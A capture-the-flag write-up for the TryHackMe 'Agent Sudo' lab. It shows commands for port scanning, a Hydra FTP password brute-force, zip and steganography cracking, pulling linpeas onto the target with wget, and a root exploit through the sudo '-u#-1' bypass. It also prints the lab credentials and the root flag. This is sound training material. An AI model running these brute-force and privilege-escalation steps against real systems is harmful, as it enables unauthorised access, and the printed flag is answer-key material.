## Agent Sudo - Try Hack Me

## 1. Overveiw
**NMAP**
**cURL**
**Hydra**
**FTP**
**JohnTheRipper**
**Steganography**
- **Binwalk**
- **Steghide**
**Linpeas**
**SUID - CVE (PrivEsc)**

Link to the machine: https://tryhackme.com/room/agentsudoctf


## 2. Enumerate
### 2.1 Scan the machine, how many ports are open?
```sh
export IP=10.10.205.137
```

First we do a **NMAP** scan:
```sh
nmap -sV -sC -oN nmap/initial $IP
```

We have 3 ports open:
- **21 FTP**
- **22 SSH**
- **80 HTTP**


### 2.2 What is the agents name?
They are hinting that we have to change the User-Agent field in the header.
We can do this either in the *inspect element* in the browser and just edit the header and change the name to the user agents name.
We can also do this with cURL:

```sh
curl -H "User-Agent: C" -L  http://10.10.125.14/
```

And we can see that there is a note for agent C, and his username is `Chris`

And we get a response back. I only tested the username as "C" because on the first page it said the note was from Agent R. So i tried A, B and C first.
Follow this [link](https://ec.haxx.se/http/http-requests) for more info on cURL

## 3 Hash Cracking and Brute-force
### 3.1 FTP Password
We run Hydra for this one on the FTP port
From the previous task we got his username: `chris`, so we will use this


```sh
hydra -t 1 -l chris -P /usr/share/wordlists/rockyou.txt $IP ftp
```

-e nsr    try "n" null password, "s" login as pass and/or "r" reversed login
-l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
-t TASKS  run TASKS number of connects in parallel per target (default: 16)
-v Verbose mode (if you need it, but it will only run slower)
-P Passwrod list, since it is uppercase it means you have to specify a FILE

Hydra found this:
```sh
[DATA] attacking ftp://10.10.125.14:21/
[21][ftp] host: 10.10.125.14   login: chris   password: crystal
[STATUS] 14344398.00 tries/min, 14344398 tries in 00:01h, 1 to do in 00:01h, 15 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-06 04:15:46
```

And we have the username and password `chris:crystal`

We then use ftp to connect to the server and download the files in there.

```sh
ftp $IP
chris
crystal
dir
get To_agentJ.txt
get cute-alien.jpg
get cuties.png
```


### 3.3 Zip file password and 3.4 Steg password
First we use `binwalk` on the pictures and see that cuties.png does contain a zip file.
Then we use the `-e` to export the contents of the picture.
So now we have a zip file, and we just need to crack the password of it with `johntheripper`

```sh
zip2john 8702.zip>zipfile.txt
john --format=zip zipfile.txt
```

And this was the output:

```sh
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 10 candidates buffered for the current salt, minimum 16 needed for performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
	alien            (8702.zip/To_agentR.txt)
1g 0:00:00:01 DONE 2/3 (2020-10-06 04:50) 0.8064g/s 35474p/s 35474c/s 35474C/s 123456..Peter
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

And the password for this zipfile is `alien`

After that we can unzip the file with `7z x 8702.zip` with the password, and we have another To_agentR.txt file. It cointains:
```
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

We use base64 on that:
```sh
echo "QXJlYTUx" | base64 -d
```
And we get `Area51`


### 3.5 Who is the other agent (in full name)?
So far we have:
Agent C - chris:crystal
Agent J - XXXXX:XXXXX
Agent R - XXXXX:XXXXX

To be able to use that password we just found, there would have to be something with the last remaining picture.
So we use steghide to extract out anything from that picture:

```sh
steghide extract -sf cute-alien.jpg
```

This will ask for a password, and we give it `Area51` as we found in the previous task.
Then we get a file calles `message.txt`, and this is the contents if we `cat` it out:
```
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

We now have a username and password for agent J.
`Agent J - james:hackerrules!`


### 3.6 SSH password
It is `james:hackerrules!`


## 4 Userflag
Found the userflag in the home directory when we logged into the james account over ssh


## 5 rootflag
User linpeas to check for privesc stuff:

*On our machine:*
```sh
python3 -m http.server
```

*On the victim machine:*
```sh
wget "<ourIP>:8000/linpeas.sh"
```

Then we mark it executable and run it.
Here are some of the more usefull from the scan:

**VERSIONS**
```
Linux version 4.15.0-55-generic (buildd@lcy01-amd64-029) (gcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04.1)) #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019
Distributor ID: Ubuntu
Description:    Ubuntu 18.04.3 LTS
Release:        18.04
Codename:       bionic
Sudo version 1.8.21p2
```

We see that james is in the sudo group and we can run the following command to see what he can run:
`sudo -l` and it will output this:

```sh
sudo -l
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

So we can run /bin/bash on james as root. And we found an exploit explaining all of this [here](https://www.exploit-db.com/exploits/47502)
If we just try `sudo bash` we get an error saying we cant do it as root. However, the exploit has a way of buypassing this, and we run the following command `sudo -u#-1 /bin/bash`
Here is the description on how it works from exploitDB:

*Description :
Sudo doesn't check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv
-u#-1 returns as 0 which is root's id*

We then type the command `sudo -u#-1 /bin/bash` and get a root shell back.
Then we can just simply cat the root.txt file out of the `root` folder.

It cointains:
```sh
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine.

Your flag is
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
```


This is what we eventually found:
Agent C - chris:crystal
Agent J - james:hackerrules!
Agent R - DesKel:


## 6 Resources
1. [Usefull FTP commands](https://www.howtoforge.com/tutorial/how-to-use-ftp-on-the-linux-shell/)
2. [Hydra Cheatsheet](https://github.com/frizb/Hydra-Cheatsheet)
3. [Usefull Stego Tools](https://0xrick.github.io/lists/stego/)
4. [John the Ripper Examples](https://www.hackingcastle.com/2020/05/john-the-ripper-password-cracking-full-tutorial.html)
5. [Final Exploit we used](https://www.exploit-db.com/exploits/47502)
